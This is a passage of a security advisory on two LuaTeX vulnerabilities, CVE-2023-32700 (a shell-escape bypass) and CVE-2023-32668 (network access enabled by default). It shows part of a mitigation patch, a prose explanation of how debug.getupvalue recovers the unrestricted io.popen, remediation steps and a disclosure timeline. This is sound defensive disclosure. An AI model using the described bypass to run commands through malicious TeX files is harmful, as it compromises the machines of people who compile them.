</span><span class="token prefix inserted">+</span><span class="token line">  %     end
</span><span class="token prefix inserted">+</span><span class="token line">  %     debug.getupvalue = checked_getupvalue
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  %     function debug.setupvalue(func, index, value)
</span><span class="token prefix inserted">+</span><span class="token line">  %         local name, orig_value = checked_getupvalue(func, index)
</span><span class="token prefix inserted">+</span><span class="token line">  %         if orig_value == do_nothing or
</span><span class="token prefix inserted">+</span><span class="token line">  %            func == checked_getupvalue
</span><span class="token prefix inserted">+</span><span class="token line">  %         then
</span><span class="token prefix inserted">+</span><span class="token line">  %             return name
</span><span class="token prefix inserted">+</span><span class="token line">  %         else
</span><span class="token prefix inserted">+</span><span class="token line">  %           return setupvalue(func, index, value)
</span><span class="token prefix inserted">+</span><span class="token line">  %         end
</span><span class="token prefix inserted">+</span><span class="token line">  %     end
</span><span class="token prefix inserted">+</span><span class="token line">  % end
</span><span class="token prefix inserted">+</span><span class="token line">  % }}
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">\endgroup
</span></span>
<span class="token coord">--- texmf-dist/tex/generic/tex-ini-files/lualatex.ini</span>
<span class="token coord">+++ texmf-dist/tex/generic/tex-ini-files/lualatex.ini</span>
<span class="token coord">@@ -13,7 +13,7 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  % a callback. Originally this code was loaded via lualatexquotejobname.tex
</span><span class="token prefix unchanged"> </span><span class="token line">  % but that required a hack around latex.ltx: the behaviour has been altered
</span><span class="token prefix unchanged"> </span><span class="token line">  % to allow the callback route to be used directly.
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  \global\everyjob{\directlua{require("lualatexquotejobname.lua")}}
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  \global\everyjob\expandafter{\the\everyjob\directlua{require("lualatexquotejobname.lua")}}
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">\endgroup
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">\input latex.ltx
</span></span></code></pre>

<p>Then, rebuild your format files:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">#</span> <span class="token bash language-bash">fmtutil-sys <span class="token parameter variable">--all</span></span></span></code></pre>

<p>Finally, verify that the patch worked by testing with the exploit code at the
top of this document.</p>

<p>This patch may not provide complete protection against a motivated attacker,
so please use one of the other options if at all possible.</p>

<h3>Impact</h3>

<p>This vulnerability is quite serious: it completely defeats the security
protections of the second-most popular TeX engine. This means that <em>any</em>
TeX file — packages, classes, documents, <code>.aux</code> files, etc, — can
execute arbitrary commands on your computer.</p>

<p>Despite all this, this vulnerability has a relatively low impact for reasons
best described below:</p>

<figure>
    <img src="https://imgs.xkcd.com/comics/file_extensions.png" title="I have never
    been lied to by data in a .txt file which has been hand-aligned." alt="File
    Extensions" srcset="https://imgs.xkcd.com/comics/file_extensions_2x.png 2x"
    width="303" height="332">
    <figcaption><a href="https://xkcd.com/1301/">xkcd.com/1301/</a></figcaption>
</figure>

<p>Less facetiously, people rarely compile TeX files obtained from untrusted
sources. Most people only compile files that they have written themselves, from
trusted collaborators, or from packages distributed by their TeX distribution.
For this vulnerability to be an issue, you would need to compile an outright
malicious TeX file.</p>

<p>Most services that compile TeX files from unknown users tend to use
additional sandboxing. For example, Overleaf compiles each document in an
ephemeral container. This means that even if an attacker were to exploit this
vulnerability, they would only be able to execute commands inside the container,
which would be destroyed after the document is compiled. (And besides, Overleaf
enables unrestricted shell escape by default, so you can already execute
arbitrary commands.)</p>

<p>There are of course many services and users that will be affected by this
vulnerability, but they are the exception rather than the rule. We have observed
no signs of this vulnerability being exploited in the wild.</p>

<h3 id="how-it-works">How it Works</h3>

<h4 id="the-exploit">The Exploit</h4>

<p>When LuaTeX is started — before it runs any TeX or Lua code — it first calls
the C function <code>load_luatex_core_lua</code>. This function runs the file
<code>luatex-core.lua</code> that is embedded into the LuaTeX binary. Among
other things, this file modifies a few Lua modules, mostly for backwards
compatibility and security purposes.</p>

<p>Here’s an excerpt of the relevant code:</p>

<pre><code><span class="token keyword">local</span> io_popen              <span class="token operator">=</span> io<span class="token punctuation">.</span>popen
<span class="token comment">-- [...]</span>
<span class="token keyword">local</span> <span class="token keyword">function</span> <span class="token function">luatex_io_popen</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token punctuation">...</span><span class="token punctuation">)</span>
    <span class="token keyword">local</span> okay<span class="token punctuation">,</span> found <span class="token operator">=</span> <span class="token function">kpse_checkpermission</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token keyword">if</span> okay <span class="token keyword">and</span> found <span class="token keyword">then</span>
        <span class="token keyword">return</span> <span class="token function">io_popen</span><span class="token punctuation">(</span>found<span class="token punctuation">,</span><span class="token punctuation">...</span><span class="token punctuation">)</span>
    <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment">-- [...]</span>
io<span class="token punctuation">.</span>popen <span class="token operator">=</span> luatex_io_popen
</code></pre>

<p>The above is pretty straightforward: it saves a local copy of the original
<code>io.popen</code>, defines a new wrapper function that checks to see if the
command is allowed with the current shell escape setting, and sets
<code>io.popen</code> to the wrapper function.</p>

<p>The problem here is the local copy. The wrapper function saves a reference to
the original <code>io.popen</code>, and using the Lua standard library function
<code>debug.getupvalue</code>, we can access this internal reference. Once we’ve
extracted the internal <code>io.popen</code>, we can use it to execute arbitrary
processes without restriction, completely defeating any of the shell escape
protections.</p>

<h4 id="the-fix">The Fix</h4>

<p>The fix is fairly straightforward: instead of implementing the wrapper
function in Lua, we now implement it in C, where we can no longer access the
internals from Lua. We still reassign the function from Lua, but this is safe
since doing so removes any reference to the original <code>io.popen</code>.</p>

<h2 id="additional-issues">Additional Issues</h2>

<p>While investigating this vulnerability, I discovered a few other minor
security issues. Patches for both of these are include in LuaTeX 1.17.0, but
<em>not</em> in the raw patches listed above.</p>

<h3 id="debug-module"><code>debug</code> Module still Available with <code>--safer</code></h3>

<p>When running <code><i>LUATEX</i> --safer</code>, LuaTeX disables the <code>debug</code> module via <code>luatex-core.lua</code>:</p>

<pre><code><span class="token keyword">if</span> saferoption <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">then</span>
    <span class="token comment">-- [...]</span>
    debug <span class="token operator">=</span> <span class="token keyword">nil</span>
</code></pre>

<p>This isn’t very effective though since you can still access the entirety of the original module via <code>package.loaded.debug</code>. This is easily fixed by first <code>nil</code>’ing all the functions in the module, then by <code>nil</code>’ing <code>package.loaded.debug</code>.</p>

<p>This hasn’t been fixed yet, but it’s not really much of a vulnerability.
Hardly anyone ever uses <code><i>LUATEX</i> --safer</code>, and the
<code>debug</code> module doesn’t do anything particularly unsafe.
<code><i>LUATEX</i> --safer</code> disables it simply to reduce the attack
surface.</p>

<h3 id="luasocket"><code>luasocket</code> Enabled by Default</h3>

<h4 id="socket-summary">Summary</h4>

<p>LuaTeX includes the
<a href="https://lunarmodules.github.io/luasocket/index.html"><code>luasocket</code></a>
module, which allows you to make network requests directly from LuaTeX:</p>

<pre><code><span class="token function selector">\documentclass</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span>

<span class="token function selector">\usepackage</span><span class="token punctuation">{</span><span class="token keyword">luacode</span><span class="token punctuation">}</span>
<span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">luacode*</span><span class="token punctuation">}</span>
    <span class="token keyword">local</span> http <span class="token operator">=</span> require <span class="token string">"socket.http"</span>
    <span class="token keyword">function</span> <span class="token function">get_ip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        body<span class="token punctuation">,</span> code<span class="token punctuation">,</span> headers <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token string">"http://icanhazip.com"</span><span class="token punctuation">)</span>
        tex<span class="token punctuation">.</span><span class="token function">sprint</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>
    <span class="token keyword">end</span>
<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">luacode*</span><span class="token punctuation">}</span>
<span class="token function selector">\def</span><span class="token function selector">\getip</span><span class="token punctuation">{</span><span class="token function selector">\directlua</span><span class="token punctuation">{</span>get_ip()<span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span>
    Your IP address is <span class="token function selector">\getip</span>.
<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span>
</code></pre>

<p>This is quite useful, but it’s also a minor security risk: a malicious
document could download dangerous files to your computer, or a malicious package
could upload all your files to a remote server.</p>

<p>This issue has been assigned
<a href="https://www.cve.org/CVERecord?id=CVE-2023-32668">CVE-2023-32668</a> and
affects LuaTeX versions 0.27.0–1.16.2 which were included in TeX Live 2009–2023
and MiKTeX 2.9.0–23.4.</p>

<h4 id="socket-details">Details</h4>

<p>LuaTeX has included <code>luasocket</code> since version 0.27.0 (2008-06-24).
From the very beginning, the manual stated that <code>luasocket</code> was
enabled by default. In addition, running <code>luatex --help</code> has always
listed a <code>--nosocket</code> option, which implies that sockets are
<i>en</i>abled by default.</p>

<p>Despite all this, it is very surprising that a TeX engine allows unrestricted
network access by default. This isn’t a “vulnerability” per se, but the feature
is sufficiently dangerous, unexpected, and rarely used for it to merit a
security update.</p>

<h4 id="socket-solution">Solution</h4>

<p>Since version 1.17.0 (2023-04-29,
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/compare/b8b71a25...da4492c7"><code>b266ef07^..da4492c7</code></a>),
LuaTeX <em>disables</em> the socket library by default. You can re-enable the
<code>socket</code> module at runtime by compiling with either
<code><i>LUATEX</i> --socket</code> or <code><i>LUATEX</i>
--shell-escape</code>.</p>

<p>If you installed the LuaTeX 1.17.0 binaries from <a href="#easy">your TeX
distribution</a>, <a href="#old-tl">the manual download links above</a>, or by
<a href="#source">building version 1.17.0 from source</a>, then you have
received the above fix and <code>luasocket</code> will be disabled by
default.</p>

<p>If you have not installed LuaTeX 1.17.0, then you can block network access by
compiling all of your documents with <code><i>LUATEX</i> --nosocket</code>.</p>

<p>If you are unable to upgrade to LuaTeX 1.17.0, you <em>can</em> patch the
LuaTeX binary or <code>luatexconfig.tex</code> to disable <code>luasocket</code>
by default; however, I wouldn’t recommend this. The only reason to intentionally
use an older LuaTeX binary is to maintain backwards compatibility, but the
<code>socket</code> change intentionally breaks this.</p>

<p>If you are running the initial version of TeX Live 2023, then the security
benefits of this change outweigh the backwards compatibility concerns. But if
you’re managing a Linux/<abbr>BSD</abbr> distribution that distributes an older
version of TeX Live, then it’s probably not worth it to backport this fix.</p>

<h4 id="socket-context">ConTeXt</h4>

<p>Disabling <code>luasocket</code> by default breaks ConTeXt MkIV. TeX Live
2023 bundles a fix for this with the LuaTeX binary update. If you have manually
installed an updated LuaTeX, you can fix ConTeXt by running:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">#</span> <span class="token bash language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/%primaryflags%/%primaryflags% --socket --shell-escape/'</span> <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">type</span> <span class="token parameter variable">-p</span> mtxrun<span class="token variable">)</span></span>.lua</span></span>
</code></pre>

<p>If this worked correctly, the following command will run without any
errors:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">context <span class="token parameter variable">--luatex</span> <span class="token parameter variable">--nofile</span></span></span></code></pre>

<h2 id="timeline">Timeline</h2>

<dl>
<dt>May 20, 2008</dt>
<dd>
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/48789fc8">
<code>luasocket</code> is added to LuaTeX. (<code>48789fc8</code>)</a></dd>

<dt>March 1, 2017</dt>
<dd>
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/4d8b815d">
The <code>popen</code> vulnerability is introduced to the LuaTeX
source. (<code>4d8b815d</code>)</a></dd>

<dt>April 18, 2023</dt>
<dd>I reported all three vulnerabilities to
<code>tlsecurity@tug.org</code>.</dd>

<dd>Initial response from the TeX Live team.</dd>

<dt>April 23, 2023</dt>
<dd>
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/5650c067">
The <code>popen</code> vulnerability is patched in the LuaTeX
source. (<code>5650c067</code>)</a></dd>

<dt>April 26, 2023</dt>
<dd>
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/e7df9234">
The <code>luasocket</code> issue is patched in the LuaTeX source.
(<code>e7df9234</code>)</a></dd>

<dt>May 2, 2023</dt>
<dd><p>
<a href="https://tug.org/svn/texlive?view=revision&revision=66984">
The LuaTeX 1.17.0 is merged into the TeX Live <code>trunk</code>.
(<code>r66984</code>)</a></p>


<p><a href="https://tug.org/pipermail/tlbuild/2023q2/005325.html">
Binaries for <code>x86_64-linux</code> are distributed as an
update.</a></p></dd>

<dt>May 5, 2023</dt>
<dd><p>
<a href="https://tug.org/svn/texlive?view=revision&revision=67006">
TeX Live has now released binary updates for all architectures.
(<code>r67006</code>)</a></p>

<p>
<a href="https://github.com/MiKTeX/miktex/releases/tag/23.5">
MiKTeX distributes LuaTeX 1.17.0 as an update.
(<code>23.5</code>)</a></p></dd>

<dt>May 9, 2023</dt>
<dd>
<a href="https://wiki.linuxfromscratch.org/blfs/changeset/9eed74cc6b06a45ad8c6a881dec105281d446c8c/"
>(Beyond) Linux From Scratch releases a patch.</a>
</dd>

<dt>May 11, 2023</dt>
<dd>
<abbr>MITRE</abbr> assigns
<a href="https://www.cve.org/CVERecord?id=CVE-2023-32668">CVE-2023-32668</a>
and
<a href="https://www.cve.org/CVERecord?id=CVE-2023-32700">CVE-2023-32700</a>.
</dd>

<dt>May 13, 2023</dt>
<dd>
I privately emailed the vulnerability details to the security contacts for
Ubuntu, Debian, Arch, Gentoo, Fedora, <abbr>RHEL</abbr>,
Open<abbr>SUSE</abbr>/<abbr>SLES</abbr>, Free<abbr>BSD</abbr>,
Open<abbr>BSD</abbr>, <code>texlive.net</code>, and Overleaf.
</dd>
<dd>
<code>texlive.net</code> is patched.
</dd>

<dt>May 15, 2023</dt>
<dd>Overleaf confirms that they are unaffected.</dd>

<dt>May 17, 2023</dt>
<dd>
<a
href="https://lists.opensuse.org/archives/list/factory@lists.opensuse.org/thread/XFLJWXXXRUFX4YKRCOKPDEZSW2GJ3CNJ/"
>Open<abbr>SUSE</abbr> Tumbleweed releases a patch.</a>
</dd>

<dt>May 19, 2023</dt>
<dd>
<a href="https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=96fe8d6e">Gentoo
releases a patch.</a>
</dd>

<dt>May 20, 2023</dt>
<dd>
Embargo lifted; anyone may now publicly discuss the vulnerabilities.
</dd>

<dd>
<a
href="https://marc.info/?l=openbsd-ports-cvs&m=168458151522029">Open<abbr>BSD</abbr>
releases a patch.</a>
</dd>

<dd>
<a href="https://security-tracker.debian.org/tracker/CVE-2023-32700">Debian
releases a patch.</a>
</dd>

<dd>
<a href="https://github.com/NixOS/nixpkgs/pull/233000">Nix releases a patch.</a>
</dd>

<dt>May 22, 2023</dt>
<dd>
<a href="https://tug.org/pipermail/tex-live/2023-May/049232.html">Details posted
to <code>tex-live@tug.org</code>.</a>
</dd>

<dt>May 24, 2023</dt>
<dd>
<a href="https://mail-index.netbsd.org/pkgsrc-changes/2023/05/24/msg275455.html"
>Net<abbr>BSD</abbr> releases a patch.</a>
</dd>

<dd>
<a href="https://lists.suse.com/pipermail/sle-security-updates/2023-May/014956.html"
>Open<abbr>SUSE</abbr> Leap and <abbr>SLES</abbr> release patches.</a>
</dd>

<dd>
<a href="http://www.slackware.com/security/viewer.php?l=slackware-security&y=2023&m=slackware-security.365861"
>Slackware releases a patch.</a>
</dd>

<dt>May 27, 2023</dt>
<dd>
<a href="https://github.com/haikuports/haikuports/pull/8742"
>Haiku releases a patch.</a>
</dd>

<dd>
<a href="https://git.alpinelinux.org/aports/commit/community/texlive?id=2cb2d6e4"
>Alpine releases a patch.</a>
</dd>

<dt>May 29, 2023</dt>
<dd>
<a href="https://gitlab.archlinux.org/archlinux/packaging/packages/texlive-bin/-/tags/2023.66984-1"
>Arch releases a patch.</a>
</dd>

<dt>May 30, 2023</dt>
<dd>
<a href="https://ubuntu.com/security/notices/USN-6115-1"
>Ubuntu releases a patch.</a>
</dd>

<dd>
<a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RLY43MIRONJSJVNBDFQHQ26MP3JIOB3H/"
>Fedora releases a patch.</a>
</dd>

<dt>June 19, 2023</dt>
<dd>
<a href="https://access.redhat.com/errata/RHSA-2023:3661"
><abbr>RHEL</abbr> releases a patch.</a>
</dd>

<dt>June 21, 2023</dt>
<dd>
<a href="https://linux.oracle.com/errata/ELSA-2023-3661.html"
>Oracle Linux releases a patch.</a>
</dd>

<dt>June 23, 2023</dt>
<dd>
<a href="https://errata.almalinux.org/9/ALSA-2023-3661.html"
>Alma Linux releases a patch.</a>
</dd>

<dt>June 24, 2023</dt>
<dd>
<a href="https://errata.build.resf.org/RLSA-2023:3661"
>Rocky Linux releases a patch.</a>
</dd>
</dl>

<h2 id="credits">Credits</h2>
<p>I (Max Chernoff) discovered and reported all three vulnerabilities. I also
created the <code>luatexconfig.tex</code> patch, wrote a few <em>tiny</em>
patches for the LuaTeX source, coordinated the patch with the distributions,
and wrote this document.</p>

<p>Luigi Scarso (of the LuaTeX team) wrote all the documentation and patches for the LuaTeX binary. Karl Berry helped coordinate the release of the rare mid-year upgrade. Thank you both!</p>

<h2 id="contact">Contact</h2>

<p>If you have any questions about LuaTeX 1.17.0, <a
href="https://www.cve.org/CVERecord?id=CVE-2023-32668">CVE-2023-32668</a>, <a
href="https://www.cve.org/CVERecord?id=CVE-2023-32700">CVE-2023-32700</a>, this page,
or these vulnerabilities in general, feel free to email me at:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> bXNldmVuIGF0IHRlbHVzIGRvdCBuZXQK <span class="token operator">|</span> <a href="https://www.dcode.fr/base-64-encoding">base64 <span class="token parameter variable">-d</span></a></span></span>
</code></pre>

